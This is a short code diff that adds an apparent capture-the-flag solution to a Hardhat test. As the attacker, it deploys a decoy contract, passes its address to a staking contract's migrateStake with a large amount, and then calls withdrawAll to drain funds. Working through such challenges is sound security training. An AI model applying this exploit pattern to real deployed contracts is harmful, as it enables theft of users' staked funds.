@@ -58,6 +58,14 @@ before(async () => {
 it("solves the challenge", async function () {
 
   // implement solution here
+  let decoy = await ethers.getContractFactory("hello")
+  let d = await decoy.deploy()
+
+  await tastyStaking
+    .connect(attacker)
+    .migrateStake(await d.address, precision.mul(100_000));
+
+  await tastyStaking.connect(attacker).withdrawAll(true)
 
 });
 
